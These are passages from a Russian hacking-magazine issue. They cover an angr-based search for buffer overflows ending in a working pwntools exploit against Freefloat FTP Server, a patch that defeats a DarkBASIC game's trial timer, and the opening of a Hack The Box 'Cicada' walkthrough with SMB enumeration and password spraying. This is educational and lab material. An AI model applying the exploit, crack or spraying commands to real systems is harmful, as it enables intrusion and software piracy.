Стек выглядит вполне привычным образом. Попробуем перезаписать адрес
возврата.


import angr
import claripy


project = angr.Project('exp2_32', auto_load_libs=False)
symbolic_input = claripy.BVS("input", 48 * 8)


initial_state = project.factory.entry_state(stdin=symbolic_input,
args=['./a.out'])
initial_state.options.add('SYMBOL_FILL_UNCONSTRAINED_MEMORY')
initial_state.options.add('SYMBOL_FILL_UNCONSTRAINED_REGISTERS')


def is_fully_symbolic_pc(state):
    for i in range(state.arch.bits):
        if not state.solver.symbolic(state.regs.pc[i]):
            return False
    return True


simulation = project.factory.simgr(
    initial_state,
    save_unconstrained=True,
    stashes={
          'active' : [initial_state],
          'unconstrained' : [],
          'found' : [],
          'not_needed' : []
        }
    )


def is_successful(state):
    return simulation.unconstrained


simulation.explore(find=is_successful)


solution_state = simulation.unconstrained[0]


if is_fully_symbolic_pc(solution_state):
    solution_state.add_constraints(solution_state.regs.eip ==
0x8049196)
    solution = solution_state.solver.eval(symbolic_input,cast_to=
bytes)
    print('input:', solution)

Скрипт   подбирает   входные   данные   для   передачи   управления
на адрес 0x8049196. Как это работает? Просто запускаем симуляцию и ждем
заполнения  ящика  unconstrained.  В  него  помещаются  состояния,
из которых есть больше 256 возможных адресов перехода. Чаще всего
это значит, что регистр EIP частично или полностью зависит от контролиру‐
емых нами символических переменных. На всякий случай проверяем, что
каждый бит  регистра EIP  символический. Далее  ставим ограничение,
при котором регистр равен нужному нам значению. И запускаем конкретиза‐
цию решений.



  input:
  b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x
  00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x
  00\x00\x00\x00\x00\x00\x00\x00\x00\x96\x91\x04\x08'


Проверим, что все работает. Для удобства используем pwntools:


from pwn import *
p = process('./exp2_32')
buff = b'\x00' * 44 + b'\x96\x91\x04\x08'
p.sendline(buff)
print(p.recv())

И получаем долгожданный результат.




  $ python test_exp2.py



  [+] Starting local process './exp2_32': pid 9178


  b'overflow me : Win!\n'



  [*] Stopped process './exp2_32' (pid 9178)




ПИШЕМ АНАЛИЗАТОР VEX

Переполнения часто встречаются в таких функциях, как strcpy. Если они
импортируются из внешних библиотек, найти и проверить их применение
вручную не составляет большого труда. Однако оптимизирующие компилято‐
ры часто заменяют их инлайновой версией.
   Если компилятор давно известен, IDA Pro найдет strcpy через сигнатуры
Flirt. Но стоит поменять несколько флагов компилятора или использовать нез‐
накомую  версию,  как  IDA  становится  слепа. Напишем  универсальное
решение, которое будет работать с любым компилятором, независимо
от процессорной архитектуры и флагов сборки.
   Функцию strcpy часто реализуют как memcpy с предварительным рас‐
четом длины строки через strlen. Но бывают оптимизированные версии,
как в Visual Studio:


@loop:
mov     cl, byte [ eax]
lea     eax, [eax+0x1]
mov     byte [edx+eax-0x1], cl
test    cl, cl
jne     @loop

Нетрудно заметить, что код состоит из трех операций:
 • чтение байта по адресу;
 • запись полученного байта по другому адресу;
 • возврат управления к началу цикла.

Каждый пункт представляет собой примитив, то есть неделимый логический
блок, который можно найти в VEX-коде. Для начала найдем цикл. Затем про‐
верим, что в нем есть операция чтения, за которой следует операция записи
прочитанных байтов.


import angr


path = 'bin/vs2017'
proj = angr.Project(path, auto_load_libs=False)
bin_cfg = proj.analyses.CFGFast(force_complete_scan=False)


def get_exits(block):
  node = bin_cfg.get_any_node(block.addr)
  return [x.addr for x in node.successors]


def print_node(block):
  for x in block.vex.constant_jump_targets:
    print(hex(block.addr), hex(x))


def is_cycled_node(block):
  return block.addr in get_exits(block)


def is_load_byte(s):
  if s.tag == 'Ist_WrTmp':
    if s.data.tag == 'Iex_Load':
      if s.data.type == 'Ity_I8':
        return True


def is_store_byte(s):
  if s.tag == 'Ist_Store':
    if s.data.tag == 'Iex_RdTmp':
        return True


def is_memcpy_node(block):
  tmp_ids = []


  for s in block.vex.statements:


    if is_load_byte(s):
      tmp_ids.append(s.tmp)
      continue


    if is_store_byte(s):
      if tmp_ids:
        if s.data.tmp in tmp_ids:
          return True


print('Analyse:', path)
nodes_addr = [x.addr for x in bin_cfg.nodes_iter()]


for addr in nodes_addr:
    block = proj.factory.block(addr)


    if is_cycled_node(block):
      if is_memcpy_node(block):
        block.pp()

Базовый блок Angr — это кусок кода до команды передачи управления. Ана‐
лизируем каждый блок, который нашел CFGFast. Проверяем, что блок имеет
выход на собственное начало (это примитивный цикл). Дальше разбираем
VEX-код, перечисляя все команды внутри блока. Находим операцию чтения,
запоминаем переменную, в которую помещаются данные. Следом за ней
находим операцию записи и проверяем, что используется та же переменная,
что и при чтении.
  Мы намеренно ищем чтение одного байта, указывая тип данных Ity_I8.
Меняя размер, можно фильтровать и другие виды циклов. Но для простоты
остановимся на этом. Запустим скрипт на собранном Visual Studio файле
с memcpy.



  Analyse: bin/vs2017


  401160  mov     cl, byte ptr [esp+eax+0x68]
  401164  lea     eax, [eax+0x1]
  401167  mov     byte ptr [esp+eax-0x1], cl
  40116b  test    cl, cl
  40116d  jne     0x401160


Экспериментируя с разными файлами, находим и другие варианты.



  402f6c  rep movsb byte ptr  es:[edi], byte ptr [esi]


  4022a7  rep movsd dword ptr  es:[edi], dword ptr [esi]


  100093e4  mov     al, byte ptr [edi+esi]
  100093e7  mov     byte ptr [esi], al
  100093e9  inc     esi
  100093ea  sub     ecx, 0x1
  100093ed  jne     0x100093e4


  100069c1  mov     edx, dword ptr [esi]
  100069c3  mov     dword ptr [edi], edx
  100069c5  lea     esi, [esi+0x4]
  100069c8  lea     edi, [edi+0x4]
  100069cb  dec     eax
  100069cc  jne     0x100069c1


  100069b3  mov     dl, byte ptr [esi]
  100069b5  mov     byte ptr [edi], dl
  100069b7  inc     esi
  100069b8  inc     edi
  100069b9  dec     ecx
  100069ba  jne     0x100069b3


  1000c270  mov     al, byte ptr [esi+edx]
  1000c273  mov     byte ptr [ebp+edx-0xc], al
  1000c277  inc     edx
  1000c278  cmp     edx, ecx
  1000c27a  jl      0x1000c270


  1000687c  sub     edi, 0x4
  1000687f  sub     esi, 0x4
  10006882  mov     eax, dword ptr [esi]
  10006884  mov     dword ptr [edi], eax
  10006886  sub     ecx, 0x4
  10006889  test    ecx, 0xfffffffc
  1000688f  jne     0x1000687c


  10006851  sub     esi, 0x20
  10006854  sub     edi, 0x20
  10006857  movdqu  xmm0, xmmword ptr [esi]
  1000685b  movdqu  xmm1, xmmword ptr [esi+0x10]
  10006860  movdqu  xmmword ptr [edi], xmm0
  10006864  movdqu  xmmword ptr [edi+0x10], xmm1
  10006869  sub     ecx, 0x20
  1000686c  test    ecx, 0xffffffe0
  10006872  jne     0x10006851


Я считаю, результат вполне достойный. Мы сможем найти не только инлай‐
новые функции, но и самопальные memcpy, в которых зачастую находятся
ошибки реализации.


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ

          ЗЛОСТНАЯ
      ЭКСПЛУАТАЦИЯ
       ИСПОЛЬЗУЕМ ANGR, ЧТОБЫ НАЙТИ
                    BUFFER OVERFLOW





АТАКА НА ПРИЛОЖЕНИЕ

Я выбрал в качестве мишени классический пример, на котором  учатся
переполнять буфер: Freefloat FTP Server (zip). Объективно его легче сломать,
написав фаззер протокола. Но мне показалось интересным и поучительным
сломать его новым способом.


Отладка тяжелых случаев
Первое, что можно сделать, — включить вывод отладочных сообщений:


 import logging
 logging.getLogger('angr').setLevel('DEBUG')


Также     существует     несколько    флагов    состояний    наподобие
TRACK_MEMORY_ACTIONS,  которые   добавляют   отладочные  сообщения
в state.history.actions.
  Но я бы рекомендовал проводить отладку в PyCharm — он позволяет
во время исполнения заглядывать внутрь Angr, что неоднократно помогало
мне быстро найти поломку.



Мы не можем запустить эмуляцию с начала программы, поскольку это займет
колоссальное количество как памяти, так и времени. Сначала надо выбрать
точку для удара. Идеальным кандидатом кажется момент получения данных —
WS2_32.recv.
   Проследив псевдокод в IDA, пройдем вглубь буквально на два вызова.
Находим функцию парсинга инпута на 0x402190. Это метод класса, которому
через ECX передается структура со всеми данными. Я восстановил ее в IDA:


struct __fixed struct_ecx // sizeof=0x634
{
    __int32 SOCKET;
    __int32 PORT;
    __int32 CLIENT_PORT;                // 0
    __int32 field_C;                    // 0
    __int32 field_10;                   // 0
    char *INPUT_ptr_1024;               // XREF: build_input_str+8/r
                                        // parse_input_str+11/r
    __int32 INPUT_end;                  // XREF: build_input_str+5/r
    char str_USERNAME_a[128] __strlit(C,"UTF-8");
    char str_PASSWORD_a[128] __strlit(C,"UTF-8");
    char str_answer_w[260] __strlit(C,"UTF-8");
    char not_used[260] __strlit(C,"UTF-8");
    char str_answer_2_w[520] __strlit(C,"UTF-8");
    char str_answer_a[260] __strlit(C,"UTF-8");
    __int32 IS_TYPE_I;                  // set to 1 in INIT
};

Заполнение первоначальной структуры можно встретить в функции в самом
начале потока. Память под нее выделяется из кучи через оператор New, затем
там же выделяется второй буфер длиной в 1024 байт, и на него ставится
ссылка внутри структуры в INPUT_ptr_1024.
  Мы должны симулировать создание структуры своим кодом:


import angr


path = 'bin/FTPServer.exe'
project = angr.Project(path, auto_load_libs=False)
EIP_START = 0x402190


initial_state = project.factory.blank_state(addr=EIP_START)
initial_state.options.add('ZERO_FILL_UNCONSTRAINED_MEMORY')
initial_state.options.add('ZERO_FILL_UNCONSTRAINED_REGISTERS')


FAKE_INPUT_ADDR = 0x38000
FAKE_STRUCT_ADDR = 0x39000
FAKE_STRUCT_SIZE = 0x10000


bvs_input = initial_state.solver.BVS("bvs_input", 8*1024)
initial_state.memory.store(FAKE_STRUCT_ADDR, b'\x00' *
FAKE_STRUCT_SIZE, FAKE_STRUCT_SIZE)
initial_state.memory.store(FAKE_INPUT_ADDR, bvs_input)


angr.types.register_types(angr.types.parse_type('struct ftp_this {
char unknown[0x14]; char * str_ptr; }'))
initial_state.mem[FAKE_STRUCT_ADDR].struct.ftp_this.str_ptr =
FAKE_INPUT_ADDR
initial_state.regs.ecx = FAKE_STRUCT_ADDR

Создаем новое состояние на входе в парсер. Просим Angr заполнять неини‐
циализированные регистры и области в памяти нулями. Создаем сим‐
волическую переменную и помещаем ее на место входной строки. Angr под‐
держивает работу со структурами, так что используем их для записи str_ptr.


step_count = 0


def next_step(sim_mngr):
    global step_count
    active = sim_mngr.stashes['active']
    print(f'\nstep_count: {step_count}, active: {len(active)}')
    step_count += 1


simulation = project.factory.simgr(initial_state)
simulation.explore(step_func=next_step)

Запустив тестовую симуляцию, видим, что количество активных состояний
быстро улетает за триста, не говоря о восьми гигабайтах потребляемой опе‐
ративной памяти.


ИЗБЕГАЕМ ВЗРЫВА ПУТЕЙ

Рассмотрим возможную реализацию strcpy:


while((*dst_ptr++ = *src_ptr++) != '\0');

С конкретными значениями все просто, но если строка src_ptr символичес‐
кая, то на каждом шаге копирования возникает развилка — выйти из цикла
или пройти еще раунд.
   Стандартный поиск путей будет создавать по два состояния на каждую
итерацию. Другими словами, для успешного «копирования» символической
строки в 128 байт потребуется 256 возможных путей, 255 из которых ведут
не туда. А если после этого строка копируется еще пару раз, то количество
                                   3возможных путей возрастает до 256  !
   Поэтому при стандартном поиске путей до полного копирования длинной
строки мы доберемся примерно никогда. Придется писать собственный
алгоритм выбора, проходящий циклы до заданного предела, не отдавая
управление раньше времени.


class LoopHolder:


    def __init__(self, max_depth=15):
       self.max_depth = max_depth


    def _is_loop(self, state, item):
       block_size = state.block().size
       return (item.addr >= state.addr) and (item.addr < state.addr+
block_size)


    def _get_loop_in_list(self, state, succ_list):
       for item in succ_list:
          if self._is_loop(state, item):
             return item


    def _count_prev_iter(self, state):
       count = 0
       for item in reversed(state.history.bbl_addrs):
          if item == state.addr:
             count += 1
          else:
             break
       return count


    def _process_loop(self, state, succ_list):
       next_loop = self._get_loop_in_list(state, succ_list)
       if not next_loop: return succ_list
       prev_count = self._count_prev_iter(next_loop)
       if prev_count:
          if prev_count >= self.max_depth:
             succ_list.remove(next_loop)
             return succ_list
          else:
             return [next_loop]
       else:
          return [next_loop]


    def _filter_succ(self, state, succ_list):
       if len(succ_list) == 1:
          return succ_list
       if len(succ_list) > 1:
          return self._process_loop(state, succ_list[:])
       return []


    def _remove_old_state(self, sim_succ, old_active):
       for item in old_active:
          sim_succ.successors.remove(item)
          sim_succ.flat_successors.remove(item)
          sim_succ.all_successors.remove(item)


    def _add_new_state(self, sim_succ, new_active):
       sim_succ.successors += new_active
       sim_succ.flat_successors += new_active
       sim_succ.all_successors += new_active


    def replace_succ(self, state, sim_succ):
       active = sim_succ.successors[:]
       if active:
          new_active = self._filter_succ(state, active)
          self._remove_old_state(sim_succ, active)
          self._add_new_state(sim_succ, new_active)
       return sim_succ

Angr позволяет заменить практически любую часть встроенных алгоритмов
собственными, в данном случае мы заменим функцию successors. Она
берет конкретное состояние и возвращает адреса, куда дальше пойдет поток
управления.


loop_filter = LoopHolder(300)
unconstrained_state = None


def successor_func(state, **run_args):
    old_succ = state.project.factory.successors(state, **run_args)


    if old_succ.unconstrained_successors:
        global unconstrained_state
        unconstrained_state = old_succ.unconstrained_successors[0]


    return loop_filter.replace_succ(state, old_succ)


simulation = project.factory.simgr(initial_state)
simulation.explore(successor_func=successor_func)

Алгоритм определяет наличие цикла и смотрит количество итераций, если
число дошло до максимальной глубины — выходит, если меньше — продол‐
жает цикл.
   Заодно запоминаем найденное unconstrained, подменив successor_func,
в другом месте мы его не выловим.


            libcНастройка
Если функция типа strlen берется из внешнего импорта, она будет заменена
стабом.


 project.hook(0x403d70, angr.SIM_PROCEDURES['libc']['strncmp']())


В этом случае используется другая стратегия конкретизации символических
переменных:


 state.libc.buf_symbolic_bytes = 256
 state.libc.max_str_len = 256


Точный размер строки настраивается в состоянии эмулятора! Я убил на это
открытие несколько дней отладки, так что делюсь, чтобы тебе не пришлось
мучиться с этим.



СОКРАЩАЕМ ЧИСЛО СОСТОЯНИЙ

simulation = project.factory.simgr(initial_state)
simulation.explore(successor_func=successor_func, find=0x402212)
state = simulation.found[0]


simulation2 = project.factory.simgr(state)
simulation2.explore(successor_func=successor_func)

Следующим шагом оптимизации будет ограничение исследуемых состояний.
Внутри парсера есть несколько веток, каждая из них проверяет свою коман‐
ду: сначала QUIT, потом USER и так далее. Нет смысла идти по всем командам
одновременно,  лучше  провести  глубокую  эмуляцию  каждой  команды
по отдельности. Поэтому сначала находим состояние по адресу 0x402212 —
оно соответствует ветке команды USER.
   Дальше мы продолжаем эмуляцию без конкретной цели. Но если все идет
по плану, то в конце эмуляции, то есть когда все состояния достигнут ret
первой функции, мы поймаем unconstrained_state:


EIP_GOAL = 0x44444444 # 'DDDD'


if unconstrained_state:
    state = unconstrained_state
    if state and is_fully_symbolic_pc(state):
       state.add_constraints(state.regs.eip == EIP_GOAL)
       solution = state.solver.eval(bvs_input, cast_to=bytes)
       print('bvs_input:', solution.rstrip(b"\x00"))

Код выводит входную строку, которая приводит к контролю EIP:



  bvs_input: b'USER \x01\x01 (...) DDDD (...)'



ПРОВЕРЯЕМ ЭКСПЛОИТ

Запускаем скрипт:


from pwn import *


exploit = b'USER ' + b'\x01' * 230 + b'DDDD' + b'\r\n'


conn = remote('127.0.0.1', 21)
conn.recvline()
conn.send(exploit)
conn.recvuntil(b' ', drop=True)
conn.recvline()
conn.close()

Он подключается к FTP-серверу и валит его наповал!
ВЗЛОМ





Любишь ли ты винтажные игры? Я — очень,
поэтому сегодня мы про них и поговорим.
Вернее, не про сами игры, а про внут‐
реннее устройство таких программ, соз‐
данных с использованием древней темной            JaboHack
магии технологии DarkBASIC.


Уже как минимум полвека разработчики стараются писать компьютерные
игры не на низкоуровневых языках программирования и выдумывают какой‑то
свой скриптовый интерпретатор, заточенный под собственную игровую плат‐
форму. Казалось бы, должно быть прямо наоборот: игры — это, пожалуй,
наиболее требовательный к скорости и оптимизации кода продукт. Соответс‐
твенно, логичнее было бы и разрабатывать его на чем‑то близком к машин‐
ному коду — на С или ассемблере.
  Тем не менее даже в благословенные 80-е и 90-е годы, когда компьютеры
были большими и медленными, шла борьба за каждый такт процессора
и байт дискового пространства, большинство топовых игр имело прокладку
между железом и графикой в виде разнообразных гейм‑интерпретаторов
и скриптовых движков. Причина банальна: дело даже не в упрощении раз‐
работки, а в максимальной поддержке кросс‑платформенности — в те вре‐
мена существовал целый зоопарк всевозможных консолей и приставок,
который нужно было охватить максимально быстро и дешево.
  В  конце  прошлого  века,  вскоре  после  появления  DirectX,  контора
The Game Creators создала специально заточенный под эту технологию игро‐
вой движок DarkBASIC. Как следует из названия, в The Game Creators,
не мудрствуя лукаво, прикрутили 3D DirectX к языку Basic и принялись кле‐
пать 3D-игры на нем. Впоследствии идея так понравилась другим разработ‐
чикам, что ее взяли на вооружение (благо первые версии DarkBASIC были
open source). Потом, в 2010 году, эта технология мутировала в DarkBASIC
Professional с нативным компилятором. К настоящему моменту проект изжил
себя, и даже нагуглить какую‑то техническую информацию по исходному
DarkBASIC достаточно сложно.
  Тем не менее реализованные на нем старые винтажные игры остались,
и олдфаги их помнят. Сегодня мы разберем, как вернуть к жизни любимую
игру молодости.
   Итак, условие задачи. У нас есть старая космическая стрелялка. Незаре‐
гистрированная версия работает в режиме триала — полтора часа (точнее,
89 минут 59 секунд). Оставшееся время триала отображается при загрузке
игры в нижней части одного из стартовых экранов.





Триал можно израсходовать как сразу, так и за несколько игр — при каждой
новой загрузке счетчик оставшегося времени запоминается, и по его исте‐
чении игру запустить уже нельзя. В этом случае вместо экрана с остатком
триального времени появляется сообщение с предложением купить игру.





Попробуем пойти по пути наименьшего сопротивления — сделаем бесконеч‐
ный (ну или хотя бы неисчерпаемо длинный) триал. Detect  It Easy нам тут
не помощник — он такой винтаж не понимает и распознаёт содержимое
программы как банальный Microsoft C++. На то, что это наш пациент, указыва‐
ют многочисленные упоминания в коде языка DarkBASIC, на сайт которого
даже ссылка есть, к сожалению протухшая за давностью лет. Кроме того, мы
обнаруживаем, что программа чуть менее чем полностью состоит из оверлея,
смахивающего на файловый ресурс. Собственно из исполняемого кода там
крохотный по масштабам программы, около 5 мегабайт, загрузчик.
  В оверлее чего только нет: и графические файлы, и текстовые, причем
исходные названия файлов тоже хранятся рядом в открытом неупакованном
виде — мечта реверс‑инженера (хотя многие, конечно, скажут, что это нес‐
портивно). Поискав ключевую фразу Demo Mode, обнаруживаем внедренный
в ресурс целый текстовый файл со строками и их кодами.





Загружаем программу в отладчик x64dbg. Разумеется, при старте игры этой
фразы в памяти процесса нет, однако, прервав загрузку в первом доступном
для этого месте, мы находим уже целые две ссылки на нужные нам слова.





Первая нам не особо интересна — судя по всему, это исходный текстовый
файл из ресурса, загруженный в буфер целиком.





А вот вторая похожа на уже распарсенные данные: вероятно, в дальнейшем
программа будет работать именно с ней. Попробуем проверить. Ставим
на эту строку аппаратную точку останова и пускаем программу дальше. Мы
угадали, эта точка останова срабатывает именно перед загрузкой экрана,
на котором отображается время триального периода.





Пускай тебя не пугает такая странноватая ассемблерная конструкция —
это всего‑навсего одна из реализаций банального strlen. А вот вызыва‐
ющая эту функцию процедура выглядит уже по‑настоящему интересно (для
наглядности приведу ее начало в IDA’шном псевдокоде).





Код сильно смахивает на реализацию простенького интерпретатора, чем он
и является. Значение dword_62619C — указатель на текущую команду (PC),
команды и их параметры 32-битные, количество параметров произвольное.
Хотелось бы иметь декомпилятор, но его у нас нет. Даже если он и существо‐
вал когда‑то, то давно канул в Лету.
   Обычно в подобных случаях нас выручало, что хотя бы во встроенном
отладчике или в сообщениях об ошибках разработчики оставляют таблицу
мнемоник команд. Обработчик ошибок находится моментально — ссылки
на него ведут практически из каждой команды. Выглядит он тоже обнадежи‐
вающе.





То есть при возникновении ошибки, по идее, должен вывестись сначала
номер строки ошибки, затем номер опкода и его мнемоника, возвращаемая
функцией sub_4B3379 (причем почему‑то в буфер обмена). Но тут нас пос‐
тигает главное разочарование: в эту ветку кода программа проваливается
лишь тогда, когда указатель dword_962C68 ненулевой. У нас он именно
нулевой, причем эта беда непоправима, поскольку таблица мнемоник команд
считается именно относительно данного указателя, а в нашей реализации
игры эту отладочную информацию вероломно убрали.
   Что ж, по счастливому стечению обстоятельств нам не требуется полный
декомпилятор, нам всего‑навсего нужно быстро поменять одну константу
на другую и перейти к решению других, более интересных задач. Ставим точ‐
ку останова на выборку текущей команды из шитого кода и смотрим, как выг‐
лядит сам код.





Опкоды выделены красным, их параметры — желтым. Команда, которая обра‐
щается к загруженной строке, имеет опкод 0x29F и три параметра. Немного
смущает, что все эти три параметра представляют собой прямые ссылки
на реальные адреса, что в случае кросс‑платформенного шитого кода выг‐
лядит несколько странно. Также на скриншоте выше видно, что ссылка из пос‐
леднего параметра  указывает на  константу 0xC5, а это в десятичном
виде 197, то есть индекс строки Demo Mode - Time Remaining >.
   Несложно проверить предположение, что команда с опкодом 0x29F заг‐
ружает  строку из массива по заданному индексу. Следующие команды
с опкодом 0x57, по сути, аналогичны 0x297, они загружают другие текстовые
строки, отображающиеся на этом экране, но нам это не особо интересно.
Гораздо интереснее команда с опкодом 0x38 — на скрине ее можно найти
по адресу 47BDA20.
   Это совсем простая команда, реализующая MOV 32-битного значения.
На источник указывает второй параметр, а на приемник — первый. Интересна
она тем, что в источнике сидит 0x59, то есть 89 — количество оставшихся
триальных минут, которые отображаются после фразы Demo Mode - Time
Remaining >. Причем следующая ближайшая команда 0x38 (на скрине она
расположена по адресу 47BDA68) загружает значение 0x3B (или 59, это счет‐
чик оставшихся секунд).
   Попробуем теперь, ухватившись за этот конец, раскрутить всю цепочку
присвоений. Есть две новости — плохая и хорошая. Плохая — и шитый код,
и его квазипеременные грузятся динамически каждый раз на разные адреса
при каждом перезапуске программы. Хорошая — константы и переменные
всегда находятся в одном и том же блоке памяти. Причем относительные
смещения между ними тоже сохраняются при каждой загрузке. Например,
параметры команды 0x29F на скрине выше (C13E88, C18D04, C1B294) при каж‐
дом запуске будут иметь разные значения, но смещения их друг относитель‐
но друга (а также относительно ссылок из параметров других команд) менять‐
ся не будут.
   Попробуем  использовать  это  полезное  наблюдение  на  практике.
Для начала посмотрим, а что вообще находится по адресу C1B294.





Это определенно смахивает на блок 32-битных констант. Приятно еще и то,
что этот блок можно найти в исходном exe-файле поиском по маске C5 00 00
00 0B 04 00 00.





Похоже, это и есть исходный образ переменных и констант, из которого они
инициализируются при загрузке интерпретатора. Давай попробуем этим вос‐
пользоваться. Ставим точку останова на вход в интерпретатор и перезапус‐
каем программу. Затем находим в памяти блок констант по этой маске
и отсчитываем от него 0xC1B294 – 0xC14E34 = 0x6460 байт — относитель‐
ное смещение между константой 0xC5 (C1B294) и переменной C14E34, вто‐
рым параметром команды 0x38, содержащим  остаток минут. На  входе
в интерпретатор, конечно же, там нули, так как значение не инициализиро‐
вано. Однако теперь на него можно поставить точку останова и посмотреть,
откуда, собственно, туда прилетает значение 59. А прилетает оно из того же
пула констант, место которого в exe-файле выглядит вот так.





Сразу видно, тут и минуты, и секунды рядом — легко исправить и проверить,
что это инициализационное значение счетчика триального времени при пер‐
вом запуске программы на компьютере. То есть такой метод работает, только
если удалить каталог с игрой и установить ее заново, пропатчив эту константу
в исполняемом файле. Довольно‑таки костыльное решение, но для начала
уже хороший задел.
  При этом мы встречаемся с первым ограничением — мы не можем сде‐
лать триал длиннее 2 часов (точнее, 119 минут 59 секунд). Если установить
значение счетчика больше 0x77 (119), то программа даже при первом запуске
скажет, что триал исчерпан. Но теперь у нас есть механизм для отслеживания
изменения квазипеременных виртуальной машины.
   Анализируя точки останова на счетчике триальных минут, мы обнаружи‐
ваем не только место этой дополнительной проверки (а сравнивается оно
там с константой по смещению 1BA03B на предыдущем скрине), но и место
в коде, где стартовое значение счетчика 89:59 заменяется текущим сох‐
раненным.
   Хорошо бы убрать это присвоение, поскольку как‑то неохота каждый раз
вымарывать весь каталог игры с компьютера после экспирации триала. Даже
если сделать триал продолжительностью два с чем‑то миллиарда минут (мак‐
симально возможное знаковое 32-битное число, которое можно запихнуть
в счетчик).
  До сих пор мы правили только константы, но как поправить шитый код —
и вообще, где он находится? Искать его, как константы, явно не получится,
ведь параметры команд всегда релоцированы на конкретные адреса. Поп‐
робуем найти адрес начала блока шитого кода. Сделать это достаточно прос‐
то. На входе в процедуру основного цикла интерпретатора мы видим такую
(надо полагать, отладочную) конструкцию.





Из выделенной на скриншоте строки видно, что стартовый адрес начала бло‐
ка шитого кода находится в переменной dword_626188. Перейдя на этот
блок, мы обнаруживаем характерную последовательность байтов, которая
уже нормально ищется в исходном exe-файле.





При  внимательном  рассмотрении  видно,  что  в  незагруженном  блоке
параметры каждой команды шитого кода представляют собой смещения
в блоке констант и данных, выраженные в 32-битных словах. По ним и про‐
изводится привязка параметров к реальным адресам при загрузке блока
в память.
   Теперь все совсем просто. Допустим, у нас есть адрес команды загружен‐
ного в память шитого кода, которую надо поправить. Чтобы найти смещение
этого места в exe-файле, нужно отнять от этого адреса базовый адрес начала
блока кода (из переменной dword_626188) и полученное смещение отложить
от начала блока кода в исполняемом файле. Если ты за моими пространными
объяснениями заскучал и успел забыть, на фига нам это надо, напоминаю:
нам нужно как‑то запатчить команду присваивания сохраненного на компь‐
ютере остатка триального времени, чтобы при каждом запуске программы
этот остаток был всегда одинаково максимальным. Для этого мы находим его
смещение в исполняемом файле: 0x1c4463 (начало блока кода в файле) +
0xd4c (относительное смещение до команды) = 0x1C51AF (искомое сме‐
щение в файле).





Команда 0x97 — тоже разновидность MOV. Источник — второй параметр,
в нашем случае квазипеременная 32D2, получатель — квазипеременная
32CB. По‑хорошему надо бы заменить ее каким‑то виртуальным аналогом
NOP, однако искать такую команду — весьма долгое занятие, тем более у нас
нет полной уверенности в том, что она вообще существует в природе. Поэто‐
му выкручиваемся максимально простым и быстрым способом: просто урав‐
ниваем источник с получателем.
  Для этого достаточно заменить один байт по смещению 1C51B3 на D2.
В итоге у нас получается команда типа MOV "32D2","32D2" — бессмыс‐
ленная, но и ничего не портящая. Перезапустив игру, мы обнаруживаем, что
мы победили: при каждом запуске программы значение триального времени
не меняется.
  На самом деле, конечно, я сильно схалтурил. По‑хорошему надо было бы
запатчить проверку на регистрацию программы или вообще сделать кейген.
Но подозреваю, для этого мне пришлось бы писать полноценный деком‐
пилятор с этого мертвого языка, а такой проект в формат статьи явно не уло‐
жится, да и практической ценности в нем чуть менее чем никакой.
   Впрочем, если тебе попадется подобный интерпретатор (в жизни всякое
бывает), тебе не придется начинать с нуля, ведь внутреннее устройство древ‐
них программ на DarkBASIC мы сегодня изучили.
ВЗЛОМ





Сегодня на примере несложной лабора‐
торной   работы   я   продемонстрирую
базовые техники работы с Active Directory
при пентестах. Мы получим информацию
через нулевую сессию SMB, проведем раз‐            RalfHacker                                                                                             hackerralf8@gmail.com
ведку и захватим аккаунт администратора
через привилегию SeBackupPrivilege.


Наша цель — прохождение машины Cicada с учебной площадки Hack The Box.
Уровень задания — легкий.


           WARNING

                            Подключаться к машинам с HTB рекомендуется
                        с применением средств анонимизации и вир‐
                          туализации. Не делай этого с компьютеров, где
                         есть важные для тебя данные, так как ты ока‐
                        жешься в общей сети с другими участниками.



РАЗВЕДКА

Сканирование портов
Добавляем IP-адрес машины в /etc/hosts:


10.10.11.35    cicada.htb

И запускаем сканирование портов.

Справка: сканирование портов
Сканирование портов — стандартный первый шаг при любой атаке. Он поз‐
воляет атакующему узнать, какие службы на хосте принимают соединение.
На основе этой информации выбирается следующий шаг к получению точки
входа.
   Наиболее известный инструмент для сканирования — это Nmap. Улучшить
результаты его работы ты можешь при помощи следующего скрипта:


 #!/bin/bash
 ports=$(nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f 1 |
 tr '
 ' ',' | sed s/,$//)
 nmap -p$ports -A $1


Он действует в два этапа. На первом производится обычное быстрое ска‐
нирование, на втором — более тщательное сканирование, с использованием
имеющихся скриптов (опция -A).





                             Результат работы скрипта

Сканер нашел девять открытых портов:
 • 88 — Kerberos;
 • 135 — Microsoft RPC;
 • 139 — NetBIOS, NetLogon;
 • 389 — LDAP;
 • 445 — SMB;
 • 593 (HTTP-RPC-EPMAP) — используется в службах DCOM и MS Exchange;
 • 3268 (LDAP) — для доступа к Global Catalog от клиента к контроллеру;
 • 3269 (LDAPS) — для доступа к Global Catalog от клиента к контроллеру
   через защищенное соединение;
 • 5985 — служба удаленного управления WinRM.

Первым делом c помощью утилиты NetExec авторизуемся от имени анонима
для службы SMB.


nxc smb 10.10.11.35 -u guest -p ''



                        Проверка анонимного доступа

Авторизация прошла успешно, попробуем собрать данные.


ТОЧКА ВХОДА

Для начала получим список общих ресурсов SMB. Для NetExec есть параметр
--shares.


nxc smb 10.10.11.35 -u guest -p '' --shares





                        Общие SMB-каталоги

Также мы можем перебрать RID объектов домена и получить имена групп
и пользователей домена. Для этого используем параметр --rid-brute.


nxc smb 10.10.11.35 -u guest -p '' --rid-brute





                            Объекты домена

Сохраняем пользователей в отдельный файл, так как они нам еще пригодят‐
ся. А затем с помощью smbclient из пакета Impacket просматриваем
содержимое общего каталога HR, так как он доступен для чтения. Там всего
один файл, скачиваем его на локальный хост.


smbclient.py ./guest:''@10.10.11.35


use HR
get Notice from HR.txt





                        Загрузка файла с SMB-ресурса

Внутри файла есть дефолтный пароль для организации.





                   Содержимое файла Notice from HR.txt

Можно предположить, что есть пользователи, которые его не изменили.
Проспреим найденный пароль по всем полученным ранее логинам. Для этого
снова обратимся к NetExec. Чтобы перебор продолжался после обнаружения
первой валидной учетки, нужно указать параметр --continue-on-success.


nxc smb 10.10.11.35 -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8'
--continue-on-success




                        Результат подбора логина к паролю

В результате получаем первую полноценную учетную запись, с которой мож‐
но опрашивать контроллер домена.
